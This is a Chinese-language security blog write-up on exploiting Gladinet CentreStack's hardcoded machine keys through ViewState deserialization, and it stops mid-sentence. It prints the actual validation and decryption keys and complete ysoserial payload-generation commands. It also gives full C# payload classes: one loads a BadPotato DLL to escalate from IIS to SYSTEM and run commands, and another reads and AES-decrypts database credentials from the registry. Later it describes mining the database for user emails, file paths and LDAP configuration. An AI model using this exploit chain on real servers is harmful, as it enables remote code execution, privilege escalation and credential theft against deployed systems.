&quot;/wEPDwUJLTc5MTM0MzY1DxYCHhNDU1JGVG9rZW4xNTk5MTIwOTM2BSRmN2JkYTAwMC01YjNlLTQ2MWMtODUyYy04MDhlOWM5YWI4YzQWAmYPZBYCAgEPZBYCAgEPZBYEAgQPZBYIZg8PFgIeCEltYWdlVXJsBRVpbWFnZXMvdGVhbWNsb3VkMi5qcGdkZAIBDw8WAh8BBRhpbWFnZXMvY2VudHJlc3RhY2tfbC5wbmdkZAICD2QWBgICDw8WAh4HVG9vbFRpcAUJVXNlciBOYW1lFgIeC3BsYWNlaG9sZGVyBQlVc2VyIE5hbWVkAgYPZBYCAgEPDxYCHwIFCFBhc3N3b3JkFgIfAwUIUGFzc3dvcmRkAgoPDxYEHgtOYXZpZ2F0ZVVybAUPR0Nsb3VkUGxhbi5hc3B4HgdWaXNpYmxlaGRkAgsPDxYCHgRUZXh0ZGRkAgoPDxYCHwYFC0NlbnRyZVN0YWNrZGRkMTmsZSWav/7DTVPhcB8+QA8OWceS26J2YazzfcBTmT8=&quot; --vkey &quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --valg SHA256 --dkey &quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --dalg &quot;AES&quot; <br></code></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/jMW4Xxdkqvd6E6Cx.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image8.png?imageSlim" alt="图片"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>当前的命令执行是 IIS 的权限，我们可以利用土豆提权到 System 。可以通过 ActivitySurrogateSelectorFromFile 利用链来实现。该链可以做到代码执行，这里可以通过加载土豆提权的 dll 实现权限提升。</p><p>这里使用 Godzilla 中的 BadPotato.dll 做好了 HTTP 相关的封装我们可以直接在这里使用：</p><p>添加 cmd 参数调用 ToString 方法后从 result 获取结果</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image9.png?imageSlim" alt="图片"><br>代码如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Collections;<br><span class="hljs-keyword">using</span> System.IO;<br><span class="hljs-keyword">using</span> System.Reflection;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Web;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">E</span><br>&#123;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">Run</span>()</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br><span class="hljs-comment">// 通过 HTTP 获取 badPotatoDll 并加载</span><br>            <span class="hljs-built_in">string</span> base64Dll = HttpContext.Current.Request.Form[<span class="hljs-string">&quot;x&quot;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(base64Dll))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>            &#125;<br>            <span class="hljs-built_in">byte</span>[] dllBytes = Convert.FromBase64String(base64Dll);<br>            Assembly assembly = Assembly.Load(dllBytes);<br><span class="hljs-comment">// Run 类</span><br>            Type runType = assembly.GetType(<span class="hljs-string">&quot;BadPotato.Run&quot;</span>);<br>            <span class="hljs-keyword">if</span> (runType == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>            &#125;<br>            <span class="hljs-built_in">object</span> instance = Activator.CreateInstance(runType);<br><span class="hljs-comment">// 添加参数</span><br>            <span class="hljs-keyword">var</span> parametersField = runType.GetField(<span class="hljs-string">&quot;parameters&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);<br>            <span class="hljs-keyword">if</span> (parametersField == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>            &#125;<br>            HttpContext context = HttpContext.Current;<br>            Hashtable parameters = <span class="hljs-keyword">new</span> Hashtable();<br>            parameters.Add(<span class="hljs-string">&quot;cmd&quot;</span>, Encoding.Default.GetBytes(context.Request.Form[<span class="hljs-string">&quot;c&quot;</span>]));   <br>            parametersField.SetValue(instance, parameters);<br>            <span class="hljs-comment">// 执行 toString 方法触发权限提升命令执行</span><br>            instance.ToString();<br><span class="hljs-comment">// 获取结果</span><br>            <span class="hljs-keyword">var</span> resultField = parameters[<span class="hljs-string">&quot;result&quot;</span>];<br>            <span class="hljs-keyword">if</span> (resultField != <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> Encoding.Default.GetString((<span class="hljs-built_in">byte</span>[])resultField);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">E</span>()</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            HttpContext context = HttpContext.Current;<br>            context.Server.ClearError();<br>            context.Response.Clear();<br>            context.Response.Write(Run());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (System.Exception ex)<br>        &#123;<br>            HttpContext.Current.Response.Write(<span class="hljs-string">&quot;Error: &quot;</span> + HttpUtility.HtmlEncode(ex.ToString()));<br>        &#125;<br>        HttpContext.Current.Response.Flush();<br>        HttpContext.Current.Response.End();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>生成 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile  --decryptionkey=&quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --validationkey=&quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --generator=3FE2630A -c &quot;CentreStack.BadPotato.cs;System.dll;System.Web.dll;System.Data.dll;System.Xml.dll;System.Runtime.Extensions.dll;&quot;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image10.png?imageSlim" alt="图片"></p><p><img src="https://uploader.shimo.im/f/tWTdOxYVifk8YVqK.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"></p><h3 id="获取数据库配置"><a href="#获取数据库配置" class="headerlink" title="获取数据库配置"></a>获取数据库配置</h3><p>在 CentreStack 的根目录有一个 ChangeDBSettings.exe，反编译可以找到其数据库连接信息的存储位置。</p><p><img src="https://uploader.shimo.im/f/K95nXfw8zPACgnfW.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"></p><p><img src="https://uploader.shimo.im/f/ngv87Q8GzmYkMlD8.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image14.png?imageSlim" alt="图片"><br><img src="https://uploader.shimo.im/f/NdRLCaoCavuIKiuO.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br>可以看到其更新数据库配置其实就是去修改注册表 SOFTWARE\Gladinet\Enterprise 中的值。</p><p>密码是加密后存储的，但是使用的是 AES 我们可以进行解密。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image16.png?imageSlim" alt="图片"></p><p>不过在本地搭建环境中发现是存储在 DBConn 中的，可能手动修改后才是 ChangeDBSettings 中的那样。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image17.png?imageSlim" alt="图片"></p><p>根据这个就可以去构造 Payload 获取对方数据库的配置信息了。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.IO;<br><span class="hljs-keyword">using</span> System.Security.Cryptography;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Web;<br><span class="hljs-keyword">using</span> Microsoft.Win32;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">E</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span> Random3 = <span class="hljs-string">&quot;不过，调查也显示，日本、约旦、以色列和黎巴嫩等国的受调查者大多认为美国仍将保持自己的超级大国地位。近三分之二的埃及人认为中国『永远也不会』取代美国成为唯一的超级大国。在美国人中，有57％的受调查者认为美国不会把地位输给中国，不过也有三分之一的美国人认为，中国最终将超过美国，更有7％的人认为中国已经超过美国了。西欧国家的受调查者则比去年更加认为，中国永远也不会超过美国成为世界领袖。例如，44％的西班牙人和43％的法国人认为美国将保持自己的『一超』地位，比去年的比例都增加了9个百分点。不过，在接受调查的4个西欧国家中，大多数人都认为中国已经取代美国或者必将超过美国成为世界领袖。另外，墨西哥人的17％、阿根廷人的16％和印度人的15％也都认为，中国已经取代美国，成为世界头号超级大国了。&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span> Random4 = <span class="hljs-string">&quot;moDriveは、ドライブとしてマウントできるので、フォルダコピー感覚で使えて超快適だが、無料だと容量が1Gバイトでちょっと手狭だ。「Gladinet」を利用してみよう。複数のウェブストレージを、ZumoDriveと同様、フォルダみたいに使えるようにするソフトse Software Gladinet ermöglicht es euch via Laufwerksbuchstabe zum Beispiel au&quot;</span>;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">byte</span>[] bs3 = Encoding.UTF8.GetBytes(Random3);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">byte</span>[] bs4 = Encoding.UTF8.GetBytes(Random4);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Aes aesProvider;<br><br><br>    <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">Encode</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> s</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> String.IsNullOrEmpty(s)<br>            ? String.Empty<br>            : HttpUtility.HtmlEncode(s);<br>    &#125;<br><br><br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">E</span>()</span><br>    &#123;<br>        HttpContext ctx = HttpContext.Current;<br>        ctx.Server.ClearError();<br>        ctx.Response.Clear();<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-built_in">string</span> DBConn = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBConn&quot;</span>);<br>            <span class="hljs-built_in">string</span> DBServer = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBServer&quot;</span>);<br>            <span class="hljs-built_in">string</span> DBUser = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBUser&quot;</span>);<br>            <span class="hljs-built_in">string</span> DBUserPassword = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBUserPassword&quot;</span>);<br>            <span class="hljs-built_in">string</span> DBName = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBName&quot;</span>);<br><br><br>            StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>            sb.Append(<span class="hljs-string">&quot;&lt;DBConn&gt;&quot;</span>);<br>            sb.Append(Encode(Decrypt(DBConn, <span class="hljs-number">32</span>)));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBConn&gt;&quot;</span>);<br><br><br>            sb.Append(<span class="hljs-string">&quot;&lt;DBServer&gt;&quot;</span>);<br>            sb.Append(Encode(DBServer));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBServer&gt;&quot;</span>);<br><br><br>            sb.Append(<span class="hljs-string">&quot;&lt;DBUser&gt;&quot;</span>);<br>            sb.Append(Encode(DBUser));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBUser&gt;&quot;</span>);<br><br><br>            sb.Append(<span class="hljs-string">&quot;&lt;DBUserPassword&gt;&quot;</span>);<br>            sb.Append(Encode(Decrypt(DBUserPassword, <span class="hljs-number">32</span>)));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBUserPassword&gt;&quot;</span>);<br><br><br>            sb.Append(<span class="hljs-string">&quot;&lt;DBName&gt;&quot;</span>);<br>            sb.Append(Encode(DBName));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBName&gt;&quot;</span>);<br><br><br>            ctx.Response.ContentType = <span class="hljs-string">&quot;text/plain; charset=utf-8&quot;</span>;<br>            ctx.Response.Write(sb.ToString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            ctx.Response.Write(<span class="hljs-string">&quot;Error: &quot;</span> + HttpUtility.HtmlEncode(ex.Message));<br>        &#125;<br>        <span class="hljs-keyword">finally</span><br>        &#123;<br>            ctx.Response.Flush();<br>            ctx.Response.End();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title">ReadEncryptedConnFromRegistry</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> valueName</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span> subKeyPath = <span class="hljs-string">@&quot;SOFTWARE\Gladinet\Enterprise&quot;</span>;<br><br><br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            RegistryView view = Environment.Is64BitProcess<br>                ? RegistryView.Registry64<br>                : RegistryView.Registry32;<br><br><br>            <span class="hljs-keyword">using</span> (RegistryKey hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view))<br>            <span class="hljs-keyword">using</span> (RegistryKey key = hklm.OpenSubKey(subKeyPath))<br>            &#123;<br>                <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br><br><br>                <span class="hljs-built_in">object</span> val = key.GetValue(valueName);<br>                <span class="hljs-keyword">if</span> (val == <span class="hljs-literal">null</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br><br><br>                <span class="hljs-keyword">return</span> val.ToString();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> Aes <span class="hljs-title">GetAES</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> n</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (aesProvider != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> aesProvider;<br><br><br>        Aes aes = Aes.Create();<br>        aes.KeySize = <span class="hljs-number">256</span>;<br>        aes.Key = GetBytes(bs3, n);<br>        aes.IV = GetBytes(bs4, n / <span class="hljs-number">2</span>);<br>        aesProvider = aes;<br>        <span class="hljs-keyword">return</span> aes;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">GetBytes</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] src, <span class="hljs-built_in">int</span> count</span>)</span><br>    &#123;<br>        <span class="hljs-built_in">byte</span>[] dst = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[count];<br>        Array.Copy(src, dst, count);<br>        <span class="hljs-keyword">return</span> dst;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title">Decrypt</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> cipherText, <span class="hljs-built_in">int</span> n</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(cipherText))<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br><br><br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            Aes aes = GetAES(n);<br>            <span class="hljs-built_in">byte</span>[] cipherBytes = Convert.FromBase64String(cipherText);<br>            <span class="hljs-keyword">using</span> (MemoryStream ms = <span class="hljs-keyword">new</span> MemoryStream(cipherBytes))<br>            <span class="hljs-keyword">using</span> (CryptoStream crypto = <span class="hljs-keyword">new</span> CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))<br>            <span class="hljs-keyword">using</span> (StreamReader reader = <span class="hljs-keyword">new</span> StreamReader(crypto, Encoding.UTF8))<br>            &#123;<br>                <span class="hljs-keyword">return</span> reader.ReadToEnd();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> cipherText;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>生成 Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile --decryptionkey=&quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --validationkey=&quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --generator=3FE2630A -c &quot;CentreStack.GetConn.cs;System.dll;System.Web.dll;System.Data.dll;System.Xml.dll;System.Runtime.Extensions.dll&quot;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image18.png?imageSlim" alt="图片"></p><p>其密码为 win-i3ba3ebkbaf ，其实就是主机名。</p><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>连接数据库后对其中的表进行简单分析，发现有用户邮箱、文件名称和对应路径、LDAP 配置等信息，还是很有用的。我们可以直接利用 CentreStack 本身的数据库操作 DLL 实现信息的获取。</p><p>现在来寻找数据库操作的 dll ，这里看到了一个 AddUserPage.aspx： </p><p><img src="https://uploader.shimo.im/f/DAcDnnzOmFEtVK8q.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image20.png?imageSlim" alt="图片"></p><p><img src="https://uploader.shimo.im/f/lK3SbhGuAa9IqSaM.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image22.png?imageSlim" alt="图片"><br>userlib.dll user.GladUserMgr</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image23.png?imageSlim" alt="图片"><br>继续跟进 CreateUserEx 方法，最终跟进到 GladUserDB 类。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image24.png?imageSlim" alt="图片"></p><p><img src="https://uploader.shimo.im/f/OObCZlf9PwfH4Yam.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image26.png?imageSlim" alt="图片"><br>主要关注 GetRegConnString() 和  Config.ConnectionString 可以和上面获取数据库信息的逻辑对上：</p><p>GetRegConnString 主要是直接获取注册表中的 DBConn 字段：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image27.png?imageSlim" alt="图片"><br>Config.ConnectionString 